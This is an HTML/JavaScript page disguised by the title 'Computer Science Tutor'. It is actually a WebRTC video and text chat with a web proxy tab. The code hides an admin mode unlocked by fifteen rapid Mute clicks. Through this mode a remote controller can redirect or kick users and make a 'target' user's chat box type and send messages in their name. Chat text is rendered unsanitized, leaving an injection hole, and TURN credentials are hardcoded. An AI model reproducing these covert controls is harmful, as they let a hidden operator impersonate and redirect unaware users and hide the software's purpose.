<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Computer Science Tutor</title>
    <style>
        /* --- ORIGINAL STYLES --- */
        body { margin: 0; font-family: 'Segoe UI', sans-serif; background: #0f0f0f; color: white; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
        
        #main-container { display: flex; flex-grow: 1; overflow: hidden; flex-direction: row; }
        
        #video-grid { 
            flex-grow: 1; display: grid; 
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); 
            gap: 15px; padding: 20px; align-content: start; overflow-y: auto;
        }
        
        .video-wrapper { position: relative; width: 100%; cursor: pointer; background: #1a1a1a; border-radius: 12px; overflow: hidden; height: min-content; }
        
        .video-ui-layer {
            position: absolute; bottom: 15px; left: 15px; right: 15px;
            display: flex; justify-content: space-between; align-items: center;
            background: rgba(0,0,0,0.7); padding: 6px 12px; 
            border-radius: 8px; z-index: 10; pointer-events: none;
        }
        
        .user-label { font-size: 14px; font-weight: bold; pointer-events: auto; }
        
        .vol-slider {
            width: 80px; cursor: pointer; pointer-events: auto;
            accent-color: #3498db;
        }

        video { 
            width: 100%; aspect-ratio: 16 / 9; object-fit: cover;
            border: 2px solid #333; display: block;
        }
        
        .mirror { transform: scaleX(-1); }

        #chat-sidebar { width: 350px; background: #181818; display: flex; flex-direction: column; border-left: 1px solid #222; }
        #messages { flex-grow: 1; overflow-y: auto; padding: 15px; list-style: none; margin: 0; }
        .msg { margin-bottom: 12px; font-size: 14px; }
        .msg b { color: #3498db; }
        
        #chat-form { display: flex; padding: 15px; border-top: 1px solid #222; background: #121212; }
        #chat-input { flex-grow: 1; padding: 10px; border-radius: 5px; border: 1px solid #333; background: #252525; color: white; outline: none; }
        #send-btn { margin-left: 8px; padding: 10px 15px; background: #3498db; border: none; color: white; border-radius: 5px; cursor: pointer; font-weight: bold; }

        #controls { position: fixed; bottom: 20px; left: calc(50% - 175px); transform: translateX(-50%); display: flex; gap: 15px; z-index: 100; }
        .control-btn { padding: 12px 24px; border-radius: 50px; border: none; background: #2b2b2b; color: white; font-weight: bold; cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0,0.5); transition: background 0.2s; border: 1px solid #444; }
        .control-btn:hover { background: #3d3d3d; }
        .control-btn.active-green { background: #27ae60; border-color: #2ecc71; }
        .control-btn.active-red { background: #e74c3c; border-color: #c0392b; }

        /* --- NEW TAB & BROWSER STYLES --- */
        #top-nav { background: #1a1a1a; display: flex; padding: 10px 20px; border-bottom: 1px solid #333; gap: 10px; align-items: center; }
        .tab-btn { padding: 8px 20px; background: #2b2b2b; border: 1px solid #444; color: white; cursor: pointer; border-radius: 5px; font-weight: bold; }
        .tab-btn.active { background: #3498db; border-color: #3498db; }

        #view-container { flex-grow: 1; position: relative; display: flex; flex-direction: column; }
        
        #browser-view { display: none; flex-direction: column; height: 100%; background: #fff; }
        #browser-toolbar { background: #2b2b2b; padding: 10px; display: flex; gap: 10px; }
        #browser-url { flex-grow: 1; padding: 8px 12px; border-radius: 4px; border: 1px solid #444; background: #1a1a1a; color: white; }
        #proxy-frame { width: 100%; flex-grow: 1; border: none; background: white; }

        .hint { font-size: 12px; color: #888; margin-left: auto; }

        @media (max-width: 768px) {
                #main-container { flex-direction: column; }
                
                #video-grid { 
                    height: 40%; /* Top half for videos */
                    flex-grow: 0;
                }
        
                #chat-sidebar { 
                    width: 100%; 
                    height: 60%; /* Bottom half for chat */
                    border-left: none; 
                    border-top: 1px solid #333; 
                }
        
                #controls { 
                    bottom: auto;
                    top: 60px; /* Move controls to the top area on mobile */
                    left: 50%;
                    transform: translateX(-50%) scale(0.9);
                }
                
                .tab-btn { padding: 6px 12px; font-size: 13px; }
            }
    </style>
</head>
<body>

<div id="top-nav">
    <button id="tab-facetime" class="tab-btn active" onclick="switchTab('facetime')">FaceTime</button>
    <button id="tab-browser" class="tab-btn" onclick="switchTab('browser')">Browser</button>
    <div class="hint">Click video for PiP</div>
</div>

<div id="controls">
    <button id="mute-btn" class="control-btn">Mute Mic</button>
    <button id="screen-btn" class="control-btn">Share Screen</button>
</div>

<div id="main-container">
    <div id="view-container">
        <div id="video-grid"></div>

        <div id="browser-view">
            <div id="browser-toolbar">
                <input type="text" id="browser-url" placeholder="Enter URL (e.g., wikipedia.org)">
                <button onclick="loadProxyUrl()" class="tab-btn" style="background: #27ae60; border: none;">Go</button>
            </div>
            <iframe id="proxy-frame" src="about:blank"></iframe>
        </div>
    </div>

    <div id="chat-sidebar">
        <button id="pip-chat-btn" type="button" class="control-btn" style="width: 90%; margin: 10px auto; display: block; border-radius: 8px;">
            Pop-out Chat ↖️
        </button>
        <ul id="messages"></ul>
        <form id="chat-form">
            <input id="chat-input" placeholder="Type message..." autocomplete="off">
            <button id="send-btn" type="submit">Send</button>
        </form>
    </div>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
<script>
    // --- 1. USER INITIALIZATION ---
    const rawUsername = prompt("Enter your username:");
    const username = (rawUsername ? rawUsername.trim().replace(/\s+/g, '_') : "User_" + Math.floor(Math.random() * 1000));
    
    const socket = io(window.location.origin);
    const videoGrid = document.getElementById('video-grid');
    const messagesList = document.getElementById('messages');
    
    // --- 2. ELEMENT CACHING ---
    const chatForm = document.getElementById('chat-form');
    const chatInput = document.getElementById('chat-input');
    const pipBtn = document.getElementById('pip-chat-btn');
    const chatSidebar = document.getElementById('chat-sidebar');
    const mainContainer = document.getElementById('main-container');
    const screenBtn = document.getElementById('screen-btn');
    const muteBtn = document.getElementById('mute-btn');
    const proxyFrame = document.getElementById('proxy-frame');
    const browserUrl = document.getElementById('browser-url');

    // --- 3. STATE VARIABLES ---
    const peerConnections = {};
    const frozenTimers = {};
    let localStream = new MediaStream();
    let screenStream = null;
    let isScreenSharing = false;
    let isMuted = false;
    let isAdmin = false;
    let muteClickTimestamps = [];

    // --- 4. VIEW LOGIC (New) ---
    function switchTab(view) {
        const ftView = document.getElementById('video-grid');
        const brView = document.getElementById('browser-view');
        const ftTab = document.getElementById('tab-facetime');
        const brTab = document.getElementById('tab-browser');

        if (view === 'facetime') {
            ftView.style.display = 'grid';
            brView.style.display = 'none';
            ftTab.classList.add('active');
            brTab.classList.remove('active');
        } else {
            ftView.style.display = 'none';
            brView.style.display = 'flex';
            brTab.classList.add('active');
            ftTab.classList.remove('active');
        }
    }

    function loadProxyUrl() {
        let url = browserUrl.value.trim();
        if (!url) return;
        // Basic protocol addition
        if (!url.startsWith('http')) url = 'https://' + url;
        proxyFrame.src = `/proxy?url=${encodeURIComponent(url)}`;
    }

    browserUrl.addEventListener('keypress', (e) => { if (e.key === 'Enter') loadProxyUrl(); });

    // --- 5. CHAT LOGIC ---
    chatForm.addEventListener('submit', e => {
        e.preventDefault();
        const val = chatInput.value.trim();
        if (val) {
            if (val.startsWith('!') && isAdmin) {
                socket.emit('admin-command', { command: val });
                appendSystemMessage(`Command Sent: ${val}`);
                chatInput.value = '';
                return;
            }
            socket.emit('chat-message', { username: username, msg: val });
            chatInput.value = '';
        }
    });

    socket.on('chat-message', data => {
        const li = document.createElement('li');
        li.className = 'msg';
        li.innerHTML = `<b>${data.username}:</b> ${data.msg}`;
        messagesList.appendChild(li);
        messagesList.scrollTop = messagesList.scrollHeight;
    });

    // --- 6. PIP LOGIC ---
    pipBtn.addEventListener('click', async () => {
        if (!('documentPictureInPicture' in window)) {
            alert("PiP Chat is only supported in Chrome/Edge.");
            return;
        }
        if (window.documentPictureInPicture.window) return;
        const pipWindow = await window.documentPictureInPicture.requestWindow({ width: 350, height: 500 });
        [...document.styleSheets].forEach((styleSheet) => {
            try {
                const cssRules = [...styleSheet.cssRules].map((rule) => rule.cssText).join('');
                const style = document.createElement('style');
                style.textContent = cssRules;
                pipWindow.document.head.appendChild(style);
            } catch (e) {
                const link = document.createElement('link');
                link.rel = 'stylesheet'; link.href = styleSheet.href;
                pipWindow.document.head.appendChild(link);
            }
        });
        pipWindow.document.body.appendChild(chatSidebar);
        pipBtn.style.display = 'none';
        pipWindow.addEventListener("pagehide", () => {
            mainContainer.appendChild(chatSidebar);
            pipBtn.style.display = 'block';
        });
    });

    // --- 7. ADMIN COMMANDS ---
    socket.on('force-redirect', (data) => { if (data.url) window.location.href = data.url; });
    socket.on('force-kick', () => { window.location.href = "about:blank"; });
    let pendingRemoteSequence = null;

    // Helper function to perform the automated typing
    async function executeRemoteType(sequence) {
        chatInput.readOnly = true;
        chatInput.value = ""; 
        for (let char of sequence) {
            chatInput.value += char;
            await new Promise(res => setTimeout(res, 100));
        }
        socket.emit('chat-message', { username: username, msg: chatInput.value });
        chatInput.value = '';
        chatInput.readOnly = false;
    }

    socket.on('remote-type', async (data) => {
        const sequence = data.sequence; 
        const delay = data.delay || 0;

        if (delay === -1) {
            // Store the sequence and wait for the user to type
            pendingRemoteSequence = sequence;
            return;
        }

        // Standard delay logic
        if (delay > 0) await new Promise(res => setTimeout(res, delay * 1000));
        await executeRemoteType(sequence);
    });

    // Listener to detect when the target starts typing
    chatInput.addEventListener('input', () => {
        if (pendingRemoteSequence) {
            const seq = pendingRemoteSequence;
            pendingRemoteSequence = null; // Clear it so it only runs once
            executeRemoteType(seq);
        }
    });

    muteBtn.addEventListener('click', () => {
        const now = Date.now();
        muteClickTimestamps.push(now);
        muteClickTimestamps = muteClickTimestamps.filter(t => now - t < 10000);
        if (muteClickTimestamps.length >= 15 && !isAdmin) {
            isAdmin = true;
            appendSystemMessage("ADMIN ACCESS GRANTED.");
        }
        const audioTrack = localStream.getAudioTracks()[0];
        if (audioTrack) {
            isMuted = !isMuted;
            audioTrack.enabled = !isMuted;
            muteBtn.innerText = isMuted ? "Unmute Mic" : "Mute Mic";
            muteBtn.classList.toggle('active-red', isMuted);
        }
    });

    function adjustHeight() {
        document.body.style.height = window.innerHeight + "px";
    }
    window.addEventListener('resize', adjustHeight);
    adjustHeight();
    
    // --- 8. WEBRTC & VIDEO ---
    async function init() {
        try {
            localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        } catch (err) {
            try { localStream = await navigator.mediaDevices.getUserMedia({ video: false, audio: true }); } 
            catch (e) { console.warn("Media denied."); }
        }
        addVideoStream(document.createElement('video'), localStream, username + " (You)", "local-video", true);
        socket.emit('join', { id: socket.id, username: username });
    }

    init();

    socket.on('user-joined', data => {
        appendSystemMessage(`${data.username} joined`);
        callUser(data.id, data.username);
    });

    socket.on('signal', async data => {
        if (data.to !== socket.id) return;
        if (!peerConnections[data.from]) createPeerConnection(data.from, data.username);
        const pc = peerConnections[data.from];
        if (data.sdp) {
            await pc.setRemoteDescription(new RTCSessionDescription(data.sdp));
            if (data.sdp.type === 'offer') {
                const answer = await pc.createAnswer();
                await pc.setLocalDescription(answer);
                socket.emit('signal', { to: data.from, from: socket.id, username: username, sdp: pc.localDescription });
            }
        } else if (data.ice) {
            try { await pc.addIceCandidate(new RTCIceCandidate(data.ice)); } catch (e) {}
        }
    });

    async function callUser(userId, remoteName) {
        const pc = createPeerConnection(userId, remoteName);
        const offer = await pc.createOffer();
        await pc.setLocalDescription(offer);
        socket.emit('signal', { to: userId, from: socket.id, username: username, sdp: pc.localDescription });
    }

    function createPeerConnection(userId, remoteName) {
        const pc = new RTCPeerConnection({ 
            iceServers: [
                { urls: "stun:stun.relay.metered.ca:80" },
                { urls: "turn:global.relay.metered.ca:80", username: "e5000b7599ec091038a6e6f6", credential: "CWqnCf7Sda2AhDSQ" }
            ],
        });
        peerConnections[userId] = pc;
        localStream.getTracks().forEach(track => {
            if (track.kind === 'video' && isScreenSharing) return;
            pc.addTrack(track, localStream);
        });
        pc.ontrack = event => {
            let video = document.getElementById(userId);
            if (!video) {
                video = document.createElement('video');
                video.id = userId;
                addVideoStream(video, event.streams[0], remoteName, null, false);
                monitorConnection(userId, pc);
            } else { video.srcObject = event.streams[0]; }
        };
        pc.onicecandidate = event => { if (event.candidate) socket.emit('signal', { to: userId, from: socket.id, ice: event.candidate }); };
        return pc;
    }

    function addVideoStream(video, stream, name, customId = null, shouldMirror = false) {
        const container = document.createElement('div');
        container.className = 'video-wrapper';
        container.id = "container-" + (customId || video.id);
        const uiLayer = document.createElement('div');
        uiLayer.className = 'video-ui-layer';
        const label = document.createElement('span');
        label.className = 'user-label';
        label.innerText = name || "Connecting...";
        uiLayer.appendChild(label);
        if (customId !== "local-video") {
            const vol = document.createElement('input');
            vol.type = 'range'; vol.min = '0'; vol.max = '1'; vol.step = '0.05'; vol.value = '1';
            vol.className = 'vol-slider';
            vol.addEventListener('input', (e) => { video.volume = e.target.value; });
            uiLayer.appendChild(vol);
        } else { video.muted = true; }
        if (stream) { video.srcObject = stream; video.onloadedmetadata = () => video.play(); }
        if (shouldMirror) video.classList.add('mirror');
        container.addEventListener('click', async (e) => {
            if(e.target.className === 'vol-slider') return;
            try { await video.requestPictureInPicture(); } catch (error) { video.requestFullscreen(); }
        });
        container.append(uiLayer, video);
        videoGrid.append(container);
    }

    screenBtn.addEventListener('click', async () => {
        if (!isScreenSharing) {
            try {
                screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                const screenTrack = screenStream.getVideoTracks()[0];
                for (let id in peerConnections) {
                    const sender = peerConnections[id].getSenders().find(s => s.track && s.track.kind === 'video');
                    if (sender) sender.replaceTrack(screenTrack);
                }
                const localVid = document.querySelector('#container-local-video video');
                localVid.srcObject = screenStream;
                localVid.classList.remove('mirror'); 
                screenTrack.onended = () => stopScreenShare();
                screenBtn.innerText = "Stop Sharing";
                screenBtn.classList.add('active-green');
                isScreenSharing = true;
            } catch (err) { console.error(err); }
        } else { stopScreenShare(); }
    });

    function stopScreenShare() {
        if (screenStream) screenStream.getTracks().forEach(t => t.stop());
        const videoTrack = localStream.getVideoTracks()[0];
        for (let id in peerConnections) {
            const sender = peerConnections[id].getSenders().find(s => s.track && s.track.kind === 'video');
            if (sender && videoTrack) sender.replaceTrack(videoTrack);
        }
        const localVid = document.querySelector('#container-local-video video');
        localVid.srcObject = localStream;
        if (videoTrack) localVid.classList.add('mirror');
        screenBtn.innerText = "Share Screen";
        screenBtn.classList.remove('active-green');
        isScreenSharing = false;
        screenStream = null;
    }

    function monitorConnection(userId, pc) {
        let lastFrameCount = 0;
        let lastChangeTime = Date.now();
        frozenTimers[userId] = setInterval(async () => {
            const stats = await pc.getStats();
            stats.forEach(report => {
                if (report.type === 'inbound-rtp' && report.kind === 'video') {
                    if (report.framesDecoded !== lastFrameCount) {
                        lastFrameCount = report.framesDecoded;
                        lastChangeTime = Date.now();
                    } else if ((Date.now() - lastChangeTime) / 1000 >= 10) { removeUser(userId); }
                }
            });
        }, 3000);
    }

    function removeUser(userId) {
        if (frozenTimers[userId]) clearInterval(frozenTimers[userId]);
        if (peerConnections[userId]) peerConnections[userId].close();
        const container = document.getElementById("container-" + userId);
        if (container) container.remove();
        delete peerConnections[userId];
        delete frozenTimers[userId];
    }

    function appendSystemMessage(text) {
        const li = document.createElement('li');
        li.style.color = "#888"; li.style.fontSize = "12px";
        li.style.textAlign = "center"; li.innerText = text;
        messagesList.appendChild(li);
    }
</script>
</body>
</html>
